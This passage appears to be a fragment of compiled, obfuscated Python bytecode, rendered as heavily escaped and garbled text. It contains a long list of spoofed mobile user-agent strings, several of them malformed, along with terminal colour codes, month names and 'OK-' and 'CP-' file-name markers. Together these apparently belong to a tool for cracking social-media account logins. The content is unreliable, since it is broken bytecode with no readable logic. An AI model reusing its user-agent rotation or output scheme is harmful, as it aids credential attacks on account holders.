Mobile/8L1r&\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\224Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190\\\\\\\\372\\\\\\\\206Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3\\\\\\\\372sMozilla/5.0 (iPod; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1r7\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\"\"\\\\\\\\000rM\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\227Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8E600 Safari/6533.18.5\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5r:\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r>\\\\\\\\000""\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000rM\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\210Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPhone\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1\\\\\\\\372\\\\\\\\330Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8\\\"\\\"L1Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3rE\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\216Mozilla/5.0 (iPad; U; CPU OS_3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like \\\\\\\"\\\\\\\"Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3\\\\\\\\372}Mozilla/5.0 (iPad; CPU OS 4_3 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/8F190 Safari/7534.48.3r)\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\224Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5r!\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E600 Twitter for iPhoner\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r^\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for\"\" iPadr4\\\\\\\\000\\\\\\\\000\\\\\\\\000r*\\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000""\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000rC\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\\\\\\\\"\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372nMozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148r*\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\224Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5\\\\\\\\372\\\\\\\\236Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36\\\\\\\\372sMozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36\\\\\\\\372\\\\\\\\216Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36\\\\\\\\372zMozilla/5.0 (Linux; \\\"\\\"Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36\\\\\\\\372\\\\\\\\202Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\202Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 \\\\\\\"\\\\\\\"(KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\202Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\365 \\\\\\\\000\\\\\\\\000\\\\\\\\000Mozilla/5.0 (Linux; Android 1\\\\\\\\342\\\\\\\\200\\\\\\\\246\\\\\\\\372\\\\\\\\243[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36\\\\\\\\372~Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36""\\\\\\\\372\\\\\\\\206Mozilla/5.0 (Linux; Android 11; en-au\"\"; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\227Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\222Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\212Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\230Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\212Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\207Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372Mozilla/5.0 (Linux; Android 10; en\\\"\\\"-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\\\\\\\\372\\\\\\\\202Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36\\\\\\\\372\\\\\\\\227Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chr\\\\\\\"\\\\\\\"ome/83.0.4103.106 Mobile Safari/537.36a\\\\\\\\247\\\\\\\\001\\\\\\\\000\\\\\\\\000Mozilla/5.0 (Linux; U; Android 7.0; es-us; 7.0; Redmi Note 4 Build/NRD90M)L659B) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4773.134 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2Mozilla/5.0 (Linux; U; Android 7.0; es-us; 12; Redmi Note 4 Build/NRD90M)G813D) AppleWebKit/537.36 (KHT""ML, like Gecko)83.0.4860.149 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2)\\\\\\\\352ri\\\\\\\\000\\\\\\\\000\\\\\\\\000rj\\\\\\\\000\\\\\\\\000\"\"\\\\\\\\000\\\\\\\\372\\\\\\\\212Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64T449V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4571.73 Chrome/107.0.0.0 Mobile Safari/537.36\\\\\\\\372uMozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15\\\\\\\\372\\\\\\\\204Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-K580T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4806.44 Mobile Safari/537.36\\\\\\\\372\\\\\\\\204Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-L592D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4228.58 Mobile Safari/537.36\\\\\\\\372\\\\\\\\217Mozilla/5.0 (Linux; Android 10; SM-A750FN) 9;  en-us; GT-Y602C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4870.41 Mobile Safari/537.36\\\\\\\\372\\\\\\\\217Mozilla/5.0 (Linux; Android 10; SM-A750FN) 6;  en-us; GT-O209S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4789.51 Mobile Safari/537.36\\\\\\\\372\\\\\\\\221Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-E525L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4572.143 Mobile Safari/537.36\\\\\\\\372\\\\\\\\221Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-Q191U) AppleWebKit/537.36 (KHTML, \\\"\\\"like Gecko) Chrome/95.0.4775.146 Mobile Safari/537.36\\\\\\\\372\\\\\\\\220Mozilla/5.0 (Linux; Android 10; SM-A750FN) 8;  en-us; GT-U702Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4514.138 Mobile Safari/537.36\\\\\\\\372\\\\\\\\205Mozilla/5.0 (Linux; Android  7.0; Mi 4i Build//L87A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4926.314 Mobile Safari/537.36\\\\\\\\372\\\\\\\\225Mozilla/5.0 (Linux; Android  5.0\\\\\\\"\\\\\\\"; xiaomi 6 Build/I105N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.3401.235 Mobile Safari/537.36r\\\\\\\\036\\\\\\\\000""\\\\\\\\000\\\\\\\\000r\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\\\\\\\\"\\\\\\\\000\\\\\\\\000\\\\\\\\000r#\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r'\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000r(\\\\\\\\000\"\"\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r#\\\\\\\\000\\\\\\\\000\\\\\\\\000r*\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r+\\\\\\\\000\\\\\\\\000\\\\\\\\000r,\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r-\\\\\\\\000\\\\\\\\000\\\\\\\\000r.\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000r/\\\\\\\\000\\\\\\\\000\\\\\\\\000r*\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r0\\\\\\\\000\\\\\\\\000\\\\\\\\000r1\\\\\\\\000\\\\\\\\000\\\\\\\\000r2\\\\\\\\000\\\\\\\\000\\\\\\\\000r3\\\\\\\\000\\\\\\\\000\\\\\\\\000r4\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r5\\\\\\\\000\\\\\\\\000\\\\\\\\000r6\\\\\\\\000\\\\\\\\000\\\\\\\\000r7\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r(\\\\\\\\000\\\\\\\\000\\\\\\\\000r0\\\\\\\\000\\\\\\\\000\\\\\\\\000r8\\\\\\\\000\\\\\\\\000\\\\\\\\000r9\\\\\\\\000\\\\\\\\000\\\\\\\\000r4\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000r:\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r6\\\\\\\\000\\\\\\\\000\\\\\\\\000r<\\\\\\\\000\\\\\\\\000\\\\\\\\000r=\\\\\\\\000\\\\\\\\000\\\\\\\\000r>""\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r?\\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r@\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000rA\\\\\\\\000\\\\\\\\000\\\\\\\\000rB\\\\\\\\000\\\\\\\\000\\\\\\\\000r#\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r#\\\\\\\\000\\\\\\\\000\\\\\\\\000rC\\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000rD\\\\\\\\000\\\\\\\\000\\\\\\\\000r'\\\\\\\\000\\\\\\\\000\\\\\\\\000r<\\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000\\\\\\\\000\\\\\\\\000r4\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r2\\\\\\\\000\\\\\\\\000\\\\\\\\000rE\\\\\\\\000\\\\\\\\000\\\\\\\\000rB\\\\\\\\000\\\\\\\\000\\\\\\\\000r2\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r5\\\\\\\\000\\\"\\\"\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000rB\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000rF\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000rG\\\\\\\\000\\\\\\\\000\\\\\\\\000r*\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r\"\"\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000rH\\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000\\\\\\\\000\\\\\\\\000rI\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r*\\\\\\\\000\\\\\\\\000\\\\\\\\000r5\\\\\\\\000\\\\\\\\000\\\\\\\\000rJ\\\\\\\\000\\\\\\\\000\\\\\\\\000r2\\\\\\\\000\\\\\\\\000\\\\\\\\000r?\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000rK\\\\\\\\000\\\\\\\\000""\\\\\\\\000rK\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000rL\\\\\\\\000\\\\\\\\000\\\\\\\\000r>\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000rM\\\\\\\\000\\\\\\\\000\\\\\\\\000r=\\\\\\\\000\\\\\\\\000\\\\\\\\000r6\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r5\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000rN\\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000rO\\\\\\\\000\\\\\\\"\\\\\\\"\\\\\\\\000\\\\\\\\000rP\\\\\\\\000\\\\\\\\000\\\\\\\\000rQ\\\\\\\\000\\\\\\\\000\\\\\\\\000rR\\\\\\\\000\\\\\\\\000\\\\\\\\000rR\\\\\\\\000\\\\\\\\000\\\\\\\\000rR\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000r=\\\\\\\\000\\\\\\\\000\\\\\\\\000rR\\\\\\\\000\\\\\\\\000\\\\\\\\000rE\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000rS\\\\\\\\000\\\\\\\\000\\\\\\\\000rT\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000rU\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000rV\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000rW\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000rX\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000rY\\\\\\\\000\\\\\\\\000\\\\\\\\000rZ""\\\\\\\\000\\\\\\\\000\\\\\\\\000r[\\\\\\\\000\\\\\\\\000\\\\\\\\000r7\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000rM\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\\\\\\\\\\\\\\\\\000\\\\\\\\000\\\\\\\\000r]\\\\\\\\000\\\\\\\\000\\\\\\\\000r:\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r>\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000rM\\\\\\\\000\\\\\\\\000\\\\\\\\000r^\\\\\\\\000\\\\\\\\000\\\\\\\\000r_\\\\\\\\000\\\\\\\\000\\\\\\\\000r`\\\\\\\\000\\\\\\\\000\\\\\\\\000rE\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\"\"\\\\\\\\000ra\\\\\\\\000\\\\\\\\000\\\\\\\\000rb\\\\\\\\000\\\\\\\\000\\\\\\\\000rc\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000rd\\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000\\\\\\\\000\\\\\\\\000re\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r^\\\\\\\\000\\\\\\\\000\\\\\\\\000rf\\\\\\\\000\\\\\\\\000\\\\\\\\000r4\\\\\\\\000\\\\\\\\000\\\\\\\\000r*\\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\"\\\"\\\\\\\\000rC\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\\\\\\\\"\\\\\\\\000\\\\\\\\000\\\\\\\\000rg\\\\\\\\000\\\\\\\\000\\\\\\\\000r*\\\\\\\\000\\\\\\\\000\\\\\\\\000rh\\\\\\\\000\\\\\\\\000\\\\\\\\000ri\\\\\\\\000\\\\\\\\000\\\\\\\\000rj\\\\\\\\000\\\\\\\\000\\\\\\\\000rk\\\\\\\\000\\\\\\\\000\\\\\\\\000rl\\\\\\\\000\\\\\\\\000\\\\\\\\000rm\\\\\\\\000\\\\\\\\000\\\\\\\\000rn\\\\\\\\000\\\\\\\\000\\\\\\\\000ro\\\\\\\\000\\\\\\\\000\\\\\\\\000rp\\\\\\\\000\\\\\\\\000\\\\\\\\000rq\\\\\\\\000\\\\\\\\000\\\\\\\\000rr\\\\\\\\000\\\\\\\\000\\\\\\\\000rs\\\\\\\\000\\\\\\\\000\\\\\\\\000rt\\\\\\\\000\\\\\\\\000\\\\\\\\000ru\\\\\\\\000\\\\\\\\000\\\\\\\\000rv\\\\\\\\000\\\\\\\\000\\\\\\\\000rw\\\\\\\\000""\\\\\\\\000\\\\\\\\000rx\\\\\\\\000\\\\\\\\000\\\\\\\\000ry\\\\\\\\000\\\\\\\\000\\\\\\\\000rz\\\\\\\\000\\\\\\\\000\\\\\\\\000r{\\\\\\\\000\\\\\\\\000\\\\\\\\000r|\\\\\\\\000\\\\\\\\000\\\\\\\\000)\\\\\\\\rri\\\\\\\\000\\\\\\\\000\\\\\\\\000rj\\\\\\\\000\\\\\\\\000\\\\\\\\000r}\\\\\\\\000\\\\\\\\000\\\\\\\\000r~\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\200\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\201\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\202\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\203\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\204\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\205\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\206\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\207\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\007\\\\\\\\033[1;91mz\\\\\\\\007\\\\\\\\033[1;92mz\\\\\\\\007\\\\\\\\033[1;93mz\\\\\\\\007\\\\\\\\033[1;94mz\\\\\\\\007\\\\\\\\033[1;95mz\\\\\\\\007\\\\\\\\033[1;96mz\\\\\\\\004\\\\\\\\033[0mz\\\\\\\\014\\\\\\\\033[41m\\\\\\\\033[1;97mz\\\\\\\\003\\\\\\\\033[mz\\\\\\\\005\\\\\\\\033[93mz\\\\\\\\005\\\\\\\\033[32mz\\\\\\\\005\\\\\\\\033[95mz\\\\\\\\005\\\\\\\\033[33m\\\\\\\\332\\\\\\\\007January\\\\\\\\332\\\\\\\\010FebruaryZ\\\\\\\\005MarchZ\\\\\\\\005AprilZ\\\\\\\\003MayZ\\\\\\\\004JuneZ\\\\\\\\004JulyZ\\\\\\\\006AugustZ\\\\\\\\tSeptemberZ\\\\\\\\007OctoberZ\\\\\\\\010NovemberZ\\\\\\\\010December)\\\\\\\\014\\\\\\\\332\\\\\\\\0011\\\\\\\\332\\\\\\\\0012\\\\\\\\332\\\\\\\\0013\\\\\\\\332\\\\\\\\0014\\\\\\\\332\\\\\\\\0015\\\\\\\\332\\\\\\\\0016\\\\\\\\332\\\\\\\\0017\\\\\\\\332\\\\\\\\0018\\\\\\\\332\\\\\\\\0019\\\\\\\\332\\\\\\\\00210\\\\\\\\332\"\"\\\\\\\\00211\\\\\\\\332\\\\\\\\00212Z\\\\\\\\010Devember)\\\\\\\\014\\\\\\\\332\\\\\\\"\\\\\\\"\\\\\\\\00201\\\\\\\\332\\\\\\\\00202\\\\\\\\332\\\\\\\\00203\\\\\\\\332\\\\\\\\00204Z\\\\\\\\00205Z\\\\\\\\00206Z\\\\\\\\00207Z\\\\\\\\00208Z\\\\\\\\00209r\\\\\\\\223\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\224\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\225\\\\\\\\000\\\\\\\\000\\\\\\\\000z""\\\\\\\\003OK-\\\\\\\\372\\\\\\\\001-z\\\\\\\\004.txtz\\\\\\\\003CP-c\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\004\\\\\\\\000\\\\\\\\000\\\\\\\\000C\\\\\\\\000\\\\\\\\000\\\\\\\\000s2\\\\\\\\000\\\\\\\\000\\\\\\\\000|\\\\\\\\000d\\\\\\\\001\\\\\\\\027\\\\\\\\000D\\\\\\\\000]$}\\\\\\\\001t\\\\\\\